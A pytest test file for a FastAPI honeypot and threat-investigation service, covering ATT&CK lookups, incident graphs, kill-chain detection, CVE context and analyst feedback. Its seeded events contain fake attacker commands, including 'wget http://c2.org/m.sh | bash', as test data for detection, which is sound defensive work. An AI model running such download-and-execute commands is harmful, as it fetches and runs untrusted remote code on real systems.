import json
import datetime
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.database import SessionLocal
from app.models import Investigation, HoneypotEvent, Alert, AuditLog
from app.security import create_access_token

client = TestClient(app)

@pytest.fixture
def auth_headers():
    token = create_access_token(data={"sub": "admin", "role": "admin"})
    return {"Authorization": f"Bearer {token}"}

@pytest.fixture
def analyst_headers():
    token = create_access_token(data={"sub": "analyst", "role": "analyst"})
    return {"Authorization": f"Bearer {token}"}

@pytest.fixture
def viewer_headers():
    token = create_access_token(data={"sub": "viewer", "role": "viewer"})
    return {"Authorization": f"Bearer {token}"}

def test_mitre_catalog_and_technique_lookup(analyst_headers):
    """Verifies authoritative ATT&CK catalog retrieval and technique details."""
    res = client.get("/api/v1/mitre/catalog", headers=analyst_headers)
    assert res.status_code == 200
    data = res.json()
    assert data["version"] == "v15.1"
    assert "disclaimer" in data
    assert data["tactics_count"] >= 10
    assert data["techniques_count"] >= 5

    # Test individual technique lookup
    res_tech = client.get("/api/v1/mitre/techniques/T1110.001", headers=analyst_headers)
    assert res_tech.status_code == 200
    tech = res_tech.json()
    assert tech["id"] == "T1110.001"
    assert "Password Guessing" in tech["name"]
    assert tech["tactic"] == "Credential Access"
    assert "https://attack.mitre.org" in tech["url"]
    assert "disclaimer" in tech

    # Test invalid technique returns 404
    res_invalid = client.get("/api/v1/mitre/techniques/T9999", headers=analyst_headers)
    assert res_invalid.status_code == 404

def test_mitre_live_matrix_coverage(analyst_headers):
    """Verifies live matrix coverage computation across enterprise tactics."""
    res = client.get("/api/v1/mitre/matrix", headers=analyst_headers)
    assert res.status_code == 200
    data = res.json()
    assert "matrix" in data
    assert len(data["matrix"]) >= 10
    assert "disclaimer" in data

def test_threat_investigation_graph_observed_vs_inferred(analyst_headers):
    """
    Tests investigation graph generation:
    Ensures nodes for events, IPs, users, commands, assets, and CVEs are created.
    Verifies that observed edges and inferred edges are strictly distinguished.
    """
    db = SessionLocal()
    try:
        now = datetime.datetime.utcnow()
        # Seed test event
        ev = HoneypotEvent(
            eventid="cowrie.command.input",
            timestamp=now,
            src_ip="198.51.100.77",
            dst_port=22,
            protocol="SSH",
            username="root",
            command="wget http://attacker-c2.org/malware.sh",
            file_hash="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
            severity="critical",
            is_simulated=False,
            data_source="graph_test"
        )
        db.add(ev)
        db.commit()
        db.refresh(ev)

        inv = Investigation(
            title="Graph Test Incident",
            description="Testing investigation graph relationships",
            severity="high",
            status="open",
            asset_tier="Critical Gateway",
            created_at=now,
            updated_at=now,
            related_events=json.dumps([ev.id])
        )
        db.add(inv)
        db.commit()
        db.refresh(inv)
        inv_id = inv.id
    finally:
        db.close()

    res = client.get(f"/api/v1/investigations/{inv_id}/graph", headers=analyst_headers)
    assert res.status_code == 200
    graph = res.json()

    assert graph["incident_id"] == inv_id
    assert len(graph["nodes"]) >= 5 # incident, asset, ip, user, command, event, cve
    assert len(graph["edges"]) >= 5

    # Check observed relationships
    observed_edges = [e for e in graph["edges"] if e["relationship_type"] == "observed"]
    inferred_edges = [e for e in graph["edges"] if e["relationship_type"] == "inferred"]
    assert len(observed_edges) >= 3 # ORIGINATED_FROM, TARGETED_USER, EXECUTED_COMMAND
    assert len(inferred_edges) >= 1  # TARGETS_ASSET or POTENTIALLY_EXPOSES

    # Check summary metrics
    assert graph["summary"]["observed_edges"] == len(observed_edges)
    assert graph["summary"]["inferred_edges"] == len(inferred_edges)

def test_attack_pattern_sequence_analysis(analyst_headers):
    """
    Tests multi-stage kill-chain pattern detection on an investigation case.
    Verifies distinction between observed incidents, anomalies, and heuristic forecasts.
    """
    db = SessionLocal()
    try:
        now = datetime.datetime.utcnow()
        # Seed sequential events: connect -> failed -> success -> command -> download
        ev1 = HoneypotEvent(eventid="cowrie.session.connect", timestamp=now - datetime.timedelta(seconds=20), src_ip="203.0.113.88", protocol="SSH", severity="low")
        ev2 = HoneypotEvent(eventid="cowrie.login.failed", timestamp=now - datetime.timedelta(seconds=15), src_ip="203.0.113.88", protocol="SSH", username="admin", severity="low")
        ev3 = HoneypotEvent(eventid="cowrie.login.success", timestamp=now - datetime.timedelta(seconds=10), src_ip="203.0.113.88", protocol="SSH", username="admin", severity="high")
        ev4 = HoneypotEvent(eventid="cowrie.command.input", timestamp=now - datetime.timedelta(seconds=5), src_ip="203.0.113.88", protocol="SSH", command="uname -a && id", severity="medium")
        ev5 = HoneypotEvent(eventid="cowrie.command.input", timestamp=now, src_ip="203.0.113.88", protocol="SSH", command="wget http://c2.org/m.sh | bash", severity="critical")

        db.add_all([ev1, ev2, ev3, ev4, ev5])
        db.commit()
        for e in [ev1, ev2, ev3, ev4, ev5]:
            db.refresh(e)

        inv = Investigation(
            title="Multi-Stage Kill Chain Test",
            description="Adversary progressing through kill chain stages",
            severity="critical",
            status="open",
            created_at=now,
            updated_at=now,
            related_events=json.dumps([ev1.id, ev2.id, ev3.id, ev4.id, ev5.id])
        )
        db.add(inv)
        db.commit()
        db.refresh(inv)
        inv_id = inv.id
    finally:
        db.close()

    res = client.get(f"/api/v1/investigations/{inv_id}/attack-patterns", headers=analyst_headers)
    assert res.status_code == 200
    data = res.json()

    assert data["pattern_detected"] is True
    assert data["progression_percentage"] >= 50.0
    assert len(data["stages_observed"]) >= 3
    assert len(data["observed_incidents"]) >= 2
    assert "explanation" in data
    # Check heuristic forecast disclaimer
    if data["heuristic_forecast"]:
        assert "HEURISTIC FORECAST" in data["heuristic_forecast"]["disclaimer"]

def test_asset_and_vulnerability_context(analyst_headers):
    """Tests associating perimeter assets and CVE vulnerability catalog with an incident."""
    db = SessionLocal()
    try:
        now = datetime.datetime.utcnow()
        ev = HoneypotEvent(eventid="cowrie.session.connect", timestamp=now, src_ip="198.51.100.99", dst_port=22, protocol="SSH", severity="low")
        db.add(ev)
        db.commit()
        db.refresh(ev)

        inv = Investigation(
            title="Asset Vulnerability Test",
            description="Testing asset context",
            severity="high",
            status="open",
            asset_tier="Critical Gateway",
            created_at=now,
            updated_at=now,
            related_events=json.dumps([ev.id])
        )
        db.add(inv)
        db.commit()
        db.refresh(inv)
        inv_id = inv.id
    finally:
        db.close()

    res = client.get(f"/api/v1/investigations/{inv_id}/asset-context", headers=analyst_headers)
    assert res.status_code == 200
    data = res.json()

    assert data["matched_asset"] is not None
    assert "exposure" in data["matched_asset"]
    assert len(data["correlated_vulnerabilities"]) >= 1
    # Check OpenSSH regreSSHion or CVE details
    cve_ids = [c["cve_id"] for c in data["correlated_vulnerabilities"]]
    assert "CVE-2024-6387" in cve_ids
    assert data["freshness"] is not None
    assert data["data_source"] is not None

def test_analyst_feedback_workflow_and_rbac(analyst_headers, viewer_headers):
    """
    Tests submitting human analyst feedback:
    1. Analyst submits true_positive with justification -> 200 OK.
    2. Feedback fields saved to Alert record and AuditLog.
    3. Viewer attempt is rejected with 403 Forbidden.
    4. Feedback summary aggregates review rates.
    """
    db = SessionLocal()
    try:
        now = datetime.datetime.utcnow()
        alert = Alert(
            timestamp=now,
            title="Suspicious SSH Brute Force",
            description="Automated detection alert",
            severity="high",
            rule_name="brute_force",
            src_ip="198.51.100.123",
            status="active"
        )
        db.add(alert)
        db.commit()
        db.refresh(alert)
        alert_id = alert.id
    finally:
        db.close()

    # 1. Analyst feedback submission
    payload = {
        "feedback": "true_positive",
        "justification": "Confirmed malicious dictionary attack matching threat intel C2"
    }
    res = client.post(f"/api/v1/rules/alerts/{alert_id}/feedback", json=payload, headers=analyst_headers)
    assert res.status_code == 200, res.text
    fb_data = res.json()
    assert fb_data["success"] is True
    assert fb_data["feedback_label"] == "true_positive"
    assert fb_data["reviewer_username"] == "analyst"

    # Verify database persistence
    db = SessionLocal()
    try:
        updated_alert = db.query(Alert).filter(Alert.id == alert_id).first()
        assert updated_alert.feedback_label == "true_positive"
        assert updated_alert.feedback_justification == payload["justification"]
        assert updated_alert.feedback_at is not None

        # Verify audit log recorded
        audit = db.query(AuditLog).filter(
            AuditLog.action == "ALERT_FEEDBACK_RECORDED",
            AuditLog.details.like(f"%alert #{alert_id}%")
        ).first()
        assert audit is not None
    finally:
        db.close()

    # 2. Viewer role rejection
    res_viewer = client.post(f"/api/v1/rules/alerts/{alert_id}/feedback", json=payload, headers=viewer_headers)
    assert res_viewer.status_code == 403

    # 3. Invalid feedback label validation
    bad_payload = {"feedback": "not_a_valid_label"}
    res_bad = client.post(f"/api/v1/rules/alerts/{alert_id}/feedback", json=bad_payload, headers=analyst_headers)
    assert res_bad.status_code == 422

    # 4. Feedback summary endpoint
    res_summary = client.get("/api/v1/rules/alerts/feedback-summary", headers=analyst_headers)
    assert res_summary.status_code == 200
    summary = res_summary.json()
    assert summary["total_reviewed"] >= 1
    assert summary["feedback_breakdown"]["true_positives"] >= 1
    assert "guardrail_status" in summary

def test_detection_evaluation_benchmark_metrics(analyst_headers):
    """
    Tests synthetic 20-case intrusion benchmark execution:
    Measures precision, recall, F1-score, and processing latency.
    """
    res = client.get("/api/v1/rules/evaluation/metrics", headers=analyst_headers)
    assert res.status_code == 200
    data = res.json()

    assert data["total_test_cases"] == 20
    cm = data["confusion_matrix"]
    assert cm["true_positives"] >= 5
    assert cm["true_negatives"] >= 5
    assert data["metrics"]["precision"] > 0.0
    assert data["metrics"]["recall"] > 0.0
    assert data["metrics"]["f1_score"] > 0.0
    assert data["metrics"]["average_processing_latency_ms"] >= 0.0
    assert "limitations_note" in data

